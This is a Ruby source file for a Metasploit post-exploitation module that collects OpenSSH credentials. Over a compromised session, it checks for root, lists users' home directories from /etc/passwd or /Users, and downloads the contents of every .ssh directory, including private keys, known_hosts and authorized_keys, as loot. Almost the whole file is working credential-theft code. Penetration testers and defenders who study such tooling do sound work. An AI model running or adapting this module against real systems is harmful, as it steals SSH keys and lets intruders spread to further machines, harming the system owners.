##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Common

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
			'Description'    => %q{
					This module will collect the contents of user's .ssh directory on the targeted
				machine. Additionally, known_hosts and authorized_keys and any other files are also
				downloaded. This module is largely based on firefox_creds.rb.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Jim Halfpenny'],
			'Version'        => "$Revision$",
			'Platform'       => ['linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell' ]
		))
	end

	def run
		print_status("Determining session platform and type...")
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_osx
		else
			# Make sure we are can identify the platform if not set
			paths = platform_check

			if paths.nil?
				print_error("Platform is not Unix or Linux based. This one is: #{session.platform.to_s}")
				return
			end
		end

		if paths.nil? or paths.empty?
			print_error("No users found with a .ssh directory")
			return
		end

		download_loot(paths)
	end

	def enum_users_unix
		id = whoami
		if id.nil? or id.empty?
			print_error("This session is not responding, perhaps the session is dead")
		end

		if got_root?
			# Parse /etc/passwd to get all user directories and remove duplicates
			userdirs = cmd_exec("cut -d: -f 6 /etc/passwd | sort | uniq").gsub(/\s/, "\n")
		else
			print_status("We do not have root privileges")
			print_status("Checking #{id} account for .ssh directory")
			ssh = session.shell_command("grep ^#{id}: /etc/passwd | cut -d: -f 6")

			ssh.each_line do |sshfile|
				sshfile.chomp!
				stat = cmd_exec("ls -d #{sshfile}/.ssh")
				next if stat =~ /No such file/i

				print_status("Found .ssh directory for: #{id}")
				print_status("stat = #{stat}")
				return stat
			end
			return
		end

		# we got root check all user dirs
		paths = []
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = dir + "/.ssh"

			print_status("Checking for OpenSSH profile in: #{dir}")

			stat = cmd_exec("ls #{dir}")
			if stat =~ /No such file/i
				print_error("OpenSSH profile not found in #{dir}")
				next
			else
				paths << "#{dir}"
			end
		end
		return paths
	end

	def enum_users_osx
		id = whoami
		if id.nil? or id.empty?
			print_error("This session is not responding, perhaps the session is dead")
		end

		home = "/Users/"
		if got_root?
			userdirs = cmd_exec("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/var/root\n"
		else
			print_status("We do not have root privileges")
			print_status("Checking #{id} account for .ssh directory")
			ssh = cmd_exec("ls -d #{home}#{id}/.ssh")

			ssh.each_line do |sshfile|
				sshfile.chomp!
				next if sshfile =~ /No such file/i

				print_status("Found .ssh directory for: #{id}")
				return sshfile
			end
			return
		end
			
		# we got root check all user dirs
		paths = []
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = dir + "/.ssh"

			print_status("Checking for OpenSSH profile in: #{dir}")

			stat = cmd_exec("ls #{dir}")
			if stat =~ /No such file/i
				print_error("OpenSSH profile not found in #{dir}")
				next
			end
			paths << "#{dir}"
		end
		return paths
	end

	def download_loot(paths)
		loot = ""
		paths.each do |path|
			path.chomp!
			if session.type == "meterpreter"
				session.fs.dir.foreach(path) do |file|
					print_good("Downloading #{file} file from: #{path}")
					file = path + "\\" + file
					fd = session.fs.file.new(file)
					begin
						until fd.eof?
							loot << fd.read
						end
					rescue EOFError
					ensure
						fd.close
					end
					
					file = file.split('\\').last
					store_loot("ssh.#{file}", "text/plain", session, loot, "ssh_#{file}", "OpenSSH #{file} File")
				end
			end
			if session.type != "meterpreter"
				files = cmd_exec("ls #{path}").gsub(/\s/, "\n")
				files.each_line do |file|
					file.chomp!
					print_good("Downloading #{path}/#{file}")
					data = read_file(file)
					file = file.split('/').last
					store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
				end
			end
		end
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		return cmd_exec("whoami")
	end

	def platform_check
		paths = nil
		platform = cmd_exec("uname")
		if platform =~ /Linux|HPUX|AIX|Sun|Solaris|BSD/
			@platform = :unix
			paths = enum_users_unix
		elsif platform =~ /Darwin/
			@platform = :osx
			paths = enum_users_osx
		else
			print_error("")
			print_error("Unsupported platform #{session.platform}")
		end
		return paths
	end
end
